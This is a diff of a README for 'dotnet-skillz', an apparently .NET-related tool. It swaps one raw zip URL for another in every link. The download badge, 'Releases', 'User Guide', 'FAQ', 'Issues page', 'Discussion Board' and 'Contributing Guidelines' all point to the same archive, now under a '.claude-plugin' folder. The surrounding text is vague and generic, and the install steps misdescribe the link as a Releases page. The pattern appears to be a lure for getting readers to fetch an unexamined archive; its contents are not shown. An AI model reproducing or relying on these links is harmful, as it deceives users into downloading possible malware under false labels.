@@ -1,7 +1,7 @@
 # 🎯 dotnet-skillz - Enhance Your Dotnet Applications
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip%https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip)](https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip)
+[![Download](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip%https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip)](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **dotnet-skillz**! This application provides a collection of essential skills for your dotnet applications. Whether you are a developer or just getting started, this tool can help you enhance your application's performance and functionality.
@@ -16,7 +16,7 @@ Before you start, ensure your system meets the following requirements:
 ## 📦 Download & Install
 To get started, visit the following page to download the latest version of dotnet-skillz:
 
-[Download from Releases](https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip)
+[Download from Releases](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release at the top of the page.
@@ -43,17 +43,17 @@ After installation, follow these simple steps to begin using dotnet-skillz:
 ## 📝 Documentation
 For detailed guidance on each feature and skill, check out our documentation:
 
-- [User Guide](https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip)
-- [FAQ](https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip)
+- [User Guide](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip)
+- [FAQ](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip)
 
 ## 🔧 Support
 If you encounter any issues or have questions, you can reach out for support:
 
-- **GitHub Issues:** Create an issue on the [Issues page](https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip) for any bugs or feature requests.
-- **Community Forum:** Join our [Discussion Board](https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip) for tips and to chat with other users.
+- **GitHub Issues:** Create an issue on the [Issues page](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip) for any bugs or feature requests.
+- **Community Forum:** Join our [Discussion Board](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip) for tips and to chat with other users.
 
 ## 🔄 Contributions
-We welcome contributions! If you’d like to help improve dotnet-skillz, please consider submitting a pull request. Check our [Contributing Guidelines](https://raw.githubusercontent.com/prakash-77599/dotnet-skillz/main/skills/ilspy-decompile/skillz-dotnet-v3.7-alpha.1.zip) for details on how to get started.
+We welcome contributions! If you’d like to help improve dotnet-skillz, please consider submitting a pull request. Check our [Contributing Guidelines](https://github.com/prakash-77599/dotnet-skillz/raw/refs/heads/main/.claude-plugin/dotnet_skillz_3.6.zip) for details on how to get started.
 
 ## 🤝 Acknowledgments
 Thank you for using dotnet-skillz! We appreciate your interest and support. Your feedback is vital to improving the application.
